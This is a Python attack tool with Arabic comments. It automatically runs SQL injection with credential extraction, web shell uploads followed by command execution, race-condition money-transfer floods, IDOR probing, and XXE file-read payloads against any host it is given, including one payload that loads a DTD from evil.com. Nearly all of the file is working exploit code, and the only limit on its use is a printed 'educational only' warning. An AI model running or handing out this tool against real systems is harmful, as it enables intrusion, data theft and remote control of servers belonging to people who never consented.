#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cheek Advanced Exploits - استغلالات متقدمة
المبرمج: SayerLinux
الإيميل: SaudiSayer@gmail.com
"""

import requests
import socket
import json
import base64
import urllib.parse
import time
import random
import string
import re
import os
import subprocess
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class AdvancedExploits:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'CheekAdvanced/1.0'})
        self.results = []
        self.vulnerable_endpoints = []
    
    def log_result(self, exploit_type, success, details=""):
        """تسجيل نتائج الاستغلال"""
        result = {
            'timestamp': datetime.now().isoformat(),
            'exploit_type': exploit_type,
            'target': self.target,
            'success': success,
            'details': details
        }
        self.results.append(result)
        
        if success:
            print(f"{Colors.GREEN}[+] {exploit_type}: SUCCESS - {details}{Colors.RESET}")
        else:
            print(f"{Colors.RED}[-] {exploit_type}: FAILED{Colors.RESET}")
    
    def advanced_sql_injection(self):
        """استغلال SQL Injection المتقدم"""
        print(f"{Colors.YELLOW}[*] فحص SQL Injection المتقدم...{Colors.RESET}")
        
        # بايتودات SQL Injection المتقدمة
        sql_payloads = [
            # Union-based
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "' UNION SELECT null,null,null,null,null,null,null,null,null,null--",
            "' UNION SELECT user(),database(),version(),@@datadir,@@hostname--",
            
            # Blind SQL Injection
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SLEEP(5)--",
            "' OR IF(1=1,SLEEP(5),0)--",
            "' AND pg_sleep(5)--",
            "' WAITFOR DELAY '0:0:5'--",
            
            # Error-based
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--",
            "' AND 1=CONVERT(int, (SELECT user()))--",
            
            # Time-based blind
            "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
            "' IF(1=1) THEN pg_sleep(5) END IF;--",
            
            # Out-of-band
            "' OR 1=1 INTO OUTFILE '/tmp/test.txt'--",
            "' UNION SELECT LOAD_FILE('/etc/passwd')--",
        ]
        
        # اختبار في مداخل مختلفة
        test_params = ["id", "user", "name", "page", "cat", "product", "item", "search", "q", "keyword"]
        endpoints = ["/", "/search", "/product", "/user", "/api", "/ajax"]
        
        vuln_found = False
        
        for endpoint in endpoints:
            for param in test_params:
                for payload in sql_payloads:
                    try:
                        # اختبار GET
                        url = f"http://{self.target}{endpoint}"
                        params = {param: payload}
                        
                        start_time = time.time()
                        response = self.session.get(url, params=params, timeout=15)
                        response_time = time.time() - start_time
                        
                        # اكتشاف SQL errors
                        sql_errors = [
                            "mysql_fetch_array", "mysql_fetch_assoc", "mysql_num_rows",
                            "ORA-", "Oracle error", "Oracle driver", "PostgreSQL query failed",
                            "SQLite error", "SQLite3::query()", "SQL syntax", "syntax error",
                            "Microsoft OLE DB Provider", "ODBC SQL Server Driver", "SQLServer JDBC Driver",
                            "You have an error in your SQL syntax", "supplied argument is not a valid MySQL",
                            "mysql_num_rows()", "mysql_fetch_array()", "mysql_fetch_assoc()",
                            "mysql_fetch_row()", "mysql_select_db()", "mysql_connect()",
                            "PostgreSQL query failed", "Warning: pg_", "pg_query()", "pg_exec()",
                            "SQLite error", "sqlite_", "SQLite3::", "sqlite_query()"
                        ]
                        
                        for error in sql_errors:
                            if error.lower() in response.text.lower():
                                print(f"{Colors.RED}[!] SQL Injection مكتشف!{Colors.RESET}")
                                print(f"{Colors.YELLOW}[*] المعلمة: {param}{Colors.RESET}")
                                print(f"{Colors.YELLOW}[*] البايتود: {payload}{Colors.RESET}")
                                print(f"{Colors.RED}[!] رسالة الخطأ: {error}{Colors.RESET}")
                                self.vulnerable_endpoints.append({'param': param, 'payload': payload, 'type': 'error-based'})
                                vuln_found = True
                                break
                        
                        # اكتشاف الوقت
                        if response_time > 4 and ("SLEEP" in payload or "sleep" in payload or "WAITFOR" in payload):
                            print(f"{Colors.RED}[!] Blind SQL Injection بالوقت مكتشف!{Colors.RESET}")
                            print(f"{Colors.YELLOW}[*] المعلمة: {param}{Colors.RESET}")
                            print(f"{Colors.YELLOW}[*] البايتود: {payload}{Colors.RESET}")
                            print(f"{Colors.RED}[!] وقت الاستجابة: {response_time:.2f} ثانية{Colors.RESET}")
                            self.vulnerable_endpoints.append({'param': param, 'payload': payload, 'type': 'time-based'})
                            vuln_found = True
                            break
                        
                        # اكتشاف الاختلاف في الاستجابة
                        if "UNION" in payload:
                            # اختبار مع UNION
                            test_payload1 = "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
                            test_payload2 = "' UNION SELECT 1,2,3,4,5,6,7,8,9,20--"
                            
                            response1 = self.session.get(url, params={param: test_payload1}, timeout=10)
                            response2 = self.session.get(url, params={param: test_payload2}, timeout=10)
                            
                            if len(response1.text) != len(response2.text):
                                print(f"{Colors.RED}[!] UNION-based SQL Injection مكتشف!{Colors.RESET}")
                                print(f"{Colors.YELLOW}[*] المعلمة: {param}{Colors.RESET}")
                                self.vulnerable_endpoints.append({'param': param, 'payload': payload, 'type': 'union-based'})
                                vuln_found = True
                                break
                        
                        # اختبار POST
                        post_response = self.session.post(url, data=params, timeout=10)
                        
                        for error in sql_errors:
                            if error.lower() in post_response.text.lower():
                                print(f"{Colors.RED}[!] POST SQL Injection مكتشف!{Colors.RESET}")
                                print(f"{Colors.YELLOW}[*] المعلمة: {param}{Colors.RESET}")
                                print(f"{Colors.YELLOW}[*] البايتود: {payload}{Colors.RESET}")
                                self.vulnerable_endpoints.append({'param': param, 'payload': payload, 'type': 'post-error-based'})
                                vuln_found = True
                                break
                        
                        if vuln_found:
                            break
                        
                    except:
                        continue
                
                if vuln_found:
                    break
            
            if vuln_found:
                break
        
        if vuln_found:
            self.log_result("Advanced SQL Injection", True, f"تم العثور على {len(self.vulnerable_endpoints)} نقطة ضعف")
            
            # محاولة استخراج البيانات
            self.extract_database_info()
        else:
            self.log_result("Advanced SQL Injection", False, "لا توجد ثغرات SQL Injection واضحة")
    
    def extract_database_info(self):
        """استخراج معلومات قاعدة البيانات"""
        print(f"{Colors.YELLOW}[*] محاولة استخراج معلومات قاعدة البيانات...{Colors.RESET}")
        
        if not self.vulnerable_endpoints:
            return
        
        # محاولات استخراج البيانات
        extraction_payloads = [
            "' UNION SELECT user(),database(),version(),@@datadir--",
            "' UNION SELECT table_name FROM information_schema.tables LIMIT 1--",
            "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1--",
            "' UNION SELECT username,password FROM users LIMIT 1--",
            "' UNION SELECT email,password FROM users LIMIT 1--",
            "' UNION SELECT admin_user,admin_pass FROM admin LIMIT 1--"
        ]
        
        for endpoint in self.vulnerable_endpoints[:3]:  # اختبار أول 3 نقاط ضعف
            param = endpoint['param']
            
            for payload in extraction_payloads:
                try:
                    url = f"http://{self.target}/test"
                    params = {param: payload}
                    response = self.session.get(url, params=params, timeout=10)
                    
                    # البحث عن معلومات حساسة في الاستجابة
                    sensitive_patterns = [
                        r'\w+@\w+\.\w+',  # email
                        r'[a-fA-F0-9]{32}',  # MD5 hash
                        r'\$\w+\$\w+',  # bcrypt hash
                        r'admin\w*',  # admin
                        r'root\w*',  # root
                        r'password\w*',  # password
                        r'username\w*',  # username
                    ]
                    
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        if matches:
                            print(f"{Colors.RED}[!] معلومات حساسة مكتشفة: {matches[:3]}{Colors.RESET}")
                            print(f"{Colors.YELLOW}[*] البايتود: {payload}{Colors.RESET}")
                            return
                            
                except:
                    continue
    
    def advanced_file_upload_exploit(self):
        """استغلال رفع الملفات المتقدم"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات رفع الملفات...{Colors.RESET}")
        
        # البحث عن نقاط رفع الملفات
        upload_paths = [
            '/upload', '/upload.php', '/uploads', '/file-upload', 
            '/upload/file', '/api/upload', '/upload/image',
            '/admin/upload', '/user/upload', '/media/upload'
        ]
        
        upload_found = False
        upload_url = None
        
        for path in upload_paths:
            try:
                response = self.session.get(f"http://{self.target}{path}", timeout=5)
                if response.status_code == 200 and ('upload' in response.text.lower() or 'file' in response.text.lower()):
                    upload_found = True
                    upload_url = f"http://{self.target}{path}"
                    print(f"{Colors.GREEN}[+] صفحة رفع ملفات مكتشفة: {upload_url}{Colors.RESET}")
                    break
            except:
                continue
        
        if not upload_found:
            self.log_result("File Upload", False, "لا توجد صفحات رفع ملفات")
            return False
        
        # أنواع الملفات للاختبار
        test_files = [
            # PHP Shell
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/php'),
            # ASP Shell
            ('shell.asp', '<% eval request("cmd") %>', 'image/asp'),
            # JSP Shell
            ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'image/jsp'),
            # PHP مع امتداد مزدوج
            ('shell.php.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
            # PHP بحروف كبيرة
            ('shell.PHP', '<?php system($_GET["cmd"]); ?>', 'image/php'),
            # PHP5
            ('shell.php5', '<?php system($_GET["cmd"]); ?>', 'image/php'),
            # PHAR
            ('shell.phar', '<?php system($_GET["cmd"]); ?>', 'image/php'),
            # HTML مع JavaScript
            ('shell.html', '<script>alert(document.cookie)</script>', 'text/html'),
            # XML مع XXE
            ('shell.xml', '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', 'text/xml'),
        ]
        
        vuln_found = False
        
        for filename, content, content_type in test_files:
            try:
                files = {'file': (filename, content, content_type)}
                
                # اختبار رفع الملف
                response = self.session.post(upload_url, files=files, timeout=10)
                
                # البحث عن مؤشرات النجاح
                success_indicators = [
                    'uploaded', 'success', 'تم الرفع', 'file uploaded',
                    'upload complete', 'upload successful'
                ]
                
                upload_success = False
                for indicator in success_indicators:
                    if indicator in response.text.lower():
                        upload_success = True
                        break
                
                if upload_success:
                    print(f"{Colors.GREEN}[+] تم رفع الملف: {filename}{Colors.RESET}")
                    
                    # محاولة الوصول للملف
                    possible_paths = [
                        f"/uploads/{filename}",
                        f"/upload/{filename}",
                        f"/files/{filename}",
                        f"/media/{filename}",
                        f"/images/{filename}",
                        f"/userfiles/{filename}",
                        f"/{filename}"
                    ]
                    
                    for path in possible_paths:
                        try:
                            file_response = self.session.get(f"http://{self.target}{path}", timeout=5)
                            
                            if file_response.status_code == 200:
                                print(f"{Colors.RED}[!] تم الوصول للملف: http://{self.target}{path}{Colors.RESET}")
                                
                                # اختبار تنفيذ الأوامر
                                if '.php' in filename or '.asp' in filename or '.jsp' in filename:
                                    cmd_test = self.session.get(f"http://{self.target}{path}?cmd=id", timeout=5)
                                    
                                    if "uid=" in cmd_test.text or "root:" in cmd_test.text:
                                        print(f"{Colors.RED}[!] تم تنفيذ الأوامر!{Colors.RESET}")
                                        self.log_result("File Upload RCE", True, f"تم رفع وتنفيذ: {filename}")
                                        vuln_found = True
                                        return True
                                
                                # اختبار XXE
                                elif '.xml' in filename:
                                    if "root:" in file_response.text or "daemon:" in file_response.text:
                                        print(f"{Colors.RED}[!] XXE مكتشف!{Colors.RESET}")
                                        self.log_result("XXE", True, f"تم رفع ملف XML: {filename}")
                                        vuln_found = True
                                        return True
                                
                                # اختبار XSS
                                elif '.html' in filename:
                                    if "<script>" in file_response.text:
                                        print(f"{Colors.RED}[!] HTML upload مع XSS مكتشف!{Colors.RESET}")
                                        self.log_result("HTML Upload XSS", True, f"تم رفع ملف HTML: {filename}")
                                        vuln_found = True
                                        return True
                                
                                break
                                
                        except:
                            continue
                
                # اختبار امتداد مزدوج
                double_ext_payloads = [
                    'shell.php.jpg',
                    'shell.php;.jpg',
                    'shell.php%00.jpg',
                    'shell.php\x00.jpg',
                    'shell.php\n.jpg',
                    'shell.php\r.jpg',
                    'shell.php\t.jpg'
                ]
                
                for double_filename in double_ext_payloads:
                    try:
                        files = {'file': (double_filename, content, 'image/jpeg')}
                        response = self.session.post(upload_url, files=files, timeout=10)
                        
                        if any(indicator in response.text.lower() for indicator in success_indicators):
                            print(f"{Colors.YELLOW}[*] تم رفع ملف مزدوج: {double_filename}{Colors.RESET}")
                            
                    except:
                        continue
                        
            except Exception as e:
                print(f"[-] خطأ في رفع {filename}: {e}")
                continue
        
        if not vuln_found:
            self.log_result("Advanced File Upload", False, "لا توجد ثغرات رفع ملفات ناجحة")
    
    def race_condition_exploit(self):
        """استغلال حالات التزامن (Race Condition)"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات Race Condition...{Colors.RESET}")
        
        # اختبار في نقاط مختلفة
        test_endpoints = [
            '/api/transfer', '/transfer', '/api/vote', '/vote',
            '/api/redeem', '/redeem', '/api/claim', '/claim'
        ]
        
        race_found = False
        
        for endpoint in test_endpoints:
            try:
                # محاولة تنفيذ race condition
                def make_request():
                    try:
                        response = self.session.post(
                            f"http://{self.target}{endpoint}",
                            data={'amount': '100', 'to_user': 'attacker'},
                            timeout=5
                        )
                        return response.status_code
                    except:
                        return None
                
                # تنفيذ عدة طلبات متزامنة
                with ThreadPoolExecutor(max_workers=10) as executor:
                    futures = [executor.submit(make_request) for _ in range(10)]
                    results = [f.result() for f in futures if f.result() is not None]
                
                # التحقق من النتائج
                success_count = results.count(200)
                if success_count > 5:
                    print(f"{Colors.RED}[!] Race condition محتمل في: {endpoint}{Colors.RESET}")
                    print(f"{Colors.YELLOW}[*] عدد النجاحات: {success_count}/10{Colors.RESET}")
                    self.log_result("Race Condition", True, f"نتائج غير عادية في {endpoint}")
                    race_found = True
                    break
                    
            except:
                continue
        
        if not race_found:
            self.log_result("Race Condition", False, "لا توجد مؤشرات Race Condition")
    
    def idor_exploit(self):
        """استغلال ثغرات IDOR (Insecure Direct Object References)"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات IDOR...{Colors.RESET}")
        
        # معلمات IDOR الشائعة
        idor_params = [
            'id', 'user_id', 'uid', 'account_id', 'profile_id', 'order_id',
            'invoice_id', 'document_id', 'file_id', 'report_id', 'order'
        ]
        
        # قيم الاختبار
        test_values = [1, 2, 3, 100, 1000, 9999, 12345]
        
        idor_found = False
        
        for param in idor_params:
            for value in test_values:
                try:
                    # اختبار GET
                    url = f"http://{self.target}/profile"
                    params = {param: value}
                    response = self.session.get(url, params=params, timeout=5)
                    
                    # التحقق من الاستجابة
                    if response.status_code == 200 and len(response.text) > 500:
                        # محاولة استخراج معلومات
                        sensitive_patterns = [
                            r'\w+@\w+\.\w+',  # email
                            r'\d{4}-\d{2}-\d{2}',  # date
                            r'\+?\d{10,15}',  # phone
                            r'\w+\s+\w+',  # name
                            r'\d+\.\d+',  # decimal
                        ]
                        
                        for pattern in sensitive_patterns:
                            matches = re.findall(pattern, response.text)
                            if len(matches) > 3:
                                print(f"{Colors.RED}[!] IDOR مكتشف في المعلمة {param}!{Colors.RESET}")
                                print(f"{Colors.YELLOW}[*] القيمة: {value}{Colors.RESET}")
                                print(f"{Colors.RED}[!] معلومات مكتشفة: {matches[:3]}{Colors.RESET}")
                                self.log_result("IDOR", True, f"معلومات حساسة في {param}={value}")
                                idor_found = True
                                break
                        
                        if idor_found:
                            break
                    
                    # اختبار POST
                    post_response = self.session.post(url, data=params, timeout=5)
                    
                    if post_response.status_code == 200 and len(post_response.text) > 500:
                        print(f"{Colors.RED}[!] POST IDOR محتمل في المعلمة {param}!{Colors.RESET}")
                        self.log_result("POST IDOR", True, f"استجابة غير عادية في {param}={value}")
                        idor_found = True
                        break
                    
                    # اختبار في مسار URL
                    path_response = self.session.get(f"http://{self.target}/user/{value}", timeout=5)
                    
                    if path_response.status_code == 200 and len(path_response.text) > 500:
                        print(f"{Colors.RED}[!] Path-based IDOR مكتشف!{Colors.RESET}")
                        print(f"{Colors.YELLOW}[*] المسار: /user/{value}{Colors.RESET}")
                        self.log_result("Path IDOR", True, f"معلومات في /user/{value}")
                        idor_found = True
                        break
                    
                except:
                    continue
            
            if idor_found:
                break
        
        if not idor_found:
            self.log_result("IDOR", False, "لا توجد ثغرات IDOR واضحة")
    
    def advanced_xxe_exploit(self):
        """استغلال XXE (XML External Entity) المتقدم"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات XXE المتقدمة...{Colors.RESET}")
        
        # نقاط اختبار XXE
        xxe_endpoints = [
            '/api/xml', '/xml', '/soap', '/api/soap', '/webservice',
            '/api/parse', '/parse', '/upload/xml', '/import/xml'
        ]
        
        # بايتودات XXE المتقدمة
        xxe_payloads = [
            # Basic XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [
                <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <root>&xxe;</root>''',
            
            # Blind XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [
                <!ENTITY % file SYSTEM "file:///etc/passwd">
                <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
                %eval;
                %error;
            ]>
            <root></root>''',
            
            # XXE with DTD
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [
                <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
                %dtd;
            ]>
            <root>&xxe;</root>''',
            
            # PHP filter
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [
                <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
            ]>
            <root>&xxe;</root>''',
            
            # Windows files
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [
                <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
            ]>
            <root>&xxe;</root>''',
        ]
        
        xxe_found = False
        
        for endpoint in xxe_endpoints:
            for payload in xxe_payloads:
                try:
                    # اختبار POST مع XML
                    headers = {'Content-Type': 'application/xml'}
                    response = self.session.post(
                        f"http://{self.target}{endpoint}",
                        data=payload,
                        headers=headers,
                        timeout=10
                    )
                    
                    # اكتشاف ملفات النظام
                    system_files = [
                        'root:', 'daemon:', 'bin:', 'sys:', 'sync:',
                        '[boot loader]', '[fonts]', '[extensions]',
                        'for 16-bit app support', 'mailslot=', 'file:///', 'ENTITY'
                    ]
                    
                    for file_content in system_files:
                        if file_content in response.text:
                            print(f"{Colors.RED}[!] XXE مكتشف!{Colors.RESET}")
                            print(f"{Colors.YELLOW}[*] النقطة: {endpoint}{Colors.RESET}")
                            print(f"{Colors.RED}[!] محتوى ملف النظام: {file_content[:50]}{Colors.RESET}")
                            self.log_result("XXE", True, f"تم الوصول لملفات النظام عبر {endpoint}")
                            xxe_found = True
                            return True
                    
                    # اختبار base64 encoded
                    if "PD9w" in response.text or "base64" in response.text:
                        print(f"{Colors.RED}[!] XXE مع base64 encoding مكتشف!{Colors.RESET}")
                        print(f"{Colors.YELLOW}[*] النقطة: {endpoint}{Colors.RESET}")
                        self.log_result("XXE Base64", True, f"محتوى مشفر في {endpoint}")
                        xxe_found = True
                        return True
                    
                    # اختبار DNS outbound
                    if "evil.com" in response.text or "dtd" in response.text:
                        print(f"{Colors.RED}[!] Out-of-band XXE محتمل!{Colors.RESET}")
                        print(f"{Colors.YELLOW}[*] النقطة: {endpoint}{Colors.RESET}")
                        self.log_result("XXE OOB", True, f"استجابة غير عادية في {endpoint}")
                        xxe_found = True
                        return True
                    
                except:
                    continue
            
            if xxe_found:
                break
        
        if not xxe_found:
            self.log_result("XXE", False, "لا توجد ثغرات XXE واضحة")
    
    def generate_advanced_report(self):
        """إنشاء تقرير الاستغلالات المتقدمة"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}=== تقرير الاستغلالات المتقدمة ==={Colors.RESET}")
        
        successful_exploits = [r for r in self.results if r['success']]
        
        print(f"{Colors.YELLOW}الهدف: {Colors.GREEN}{self.target}{Colors.RESET}")
        print(f"{Colors.YELLOW}الثغرات المتقدمة المكتشفة: {Colors.RED}{len(successful_exploits)}{Colors.RESET}")
        
        if successful_exploits:
            print(f"\n{Colors.RED}[!] تفاصيل الثغرات المتقدمة:{Colors.RESET}")
            for exploit in successful_exploits:
                print(f"  - {exploit['exploit_type']}: {exploit['details']}")
        
        # حفظ التقرير
        report_filename = f"advanced_exploits_report_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(report_filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, ensure_ascii=False, indent=2)
            print(f"\n{Colors.GREEN}[+] تم حفظ تقرير الاستغلالات المتقدمة في: {report_filename}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[-] فشل حفظ التقرير: {e}{Colors.RESET}")
    
    def run_all_advanced_exploits(self):
        """تشغيل جميع الاستغلالات المتقدمة"""
        print(f"{Colors.CYAN}{Colors.BOLD}=== بدء الاستغلالات المتقدمة لـ {self.target} ==={Colors.RESET}")
        
        exploits = [
            self.advanced_sql_injection,
            self.advanced_file_upload_exploit,
            self.race_condition_exploit,
            self.idor_exploit,
            self.advanced_xxe_exploit
        ]
        
        for exploit in exploits:
            try:
                exploit()
            except KeyboardInterrupt:
                print(f"\n{Colors.RED}[!] تم إيقاف الاستغلالات بواسطة المستخدم{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}[-] خطأ في {exploit.__name__}: {e}{Colors.RESET}")
                continue
        
        self.generate_advanced_report()

def main():
    print(f"{Colors.CYAN}{Colors.BOLD}")
    print(" █████╗ ███████╗██╗   ██╗ ██████╗ ███████╗███████╗██████╗ ")
    print("██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝ ██╔════╝██╔════╝██╔══██╗")
    print("███████║███████╗ ╚████╔╝ ██║  ███╗█████╗  █████╗  ██████╔╝")
    print("██╔══██║╚════██║  ╚██╔╝  ██║   ██║██╔══╝  ██╔══╝  ██╔══██╗")
    print("██║  ██║███████║   ██║   ╚██████╔╝██║     ███████╗██║  ██║")
    print("╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝")
    print(f"{Colors.PURPLE}")
    print("    الاستغلالات المتقدمة")
    print("    Advanced Exploits")
    print(f"{Colors.YELLOW}")
    print("المبرمج: SayerLinux")
    print("الإيميل: SaudiSayer@gmail.com")
    print(f"{Colors.RESET}")
    
    if len(sys.argv) != 2:
        print(f"{Colors.RED}[!] الاستخدام: python {sys.argv[0]} <target>{Colors.RESET}")
        sys.exit(1)
    
    target = sys.argv[1]
    
    print(f"{Colors.RED}[!] تحذير: هذه الأداة للأغراض التعليمية والاختبارية فقط!{Colors.RESET}")
    print(f"{Colors.RED}[!] تأكد من أن لديك صلاحية اختبار الهدف: {target}{Colors.RESET}")
    
    try:
        advanced_exploits = AdvancedExploits(target)
        advanced_exploits.run_all_advanced_exploits()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] تم إيقاف الأداة بواسطة المستخدم{Colors.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[!] خطأ غير متوقع: {e}{Colors.RESET}")
        sys.exit(1)

if __name__ == '__main__':
    import sys
    main()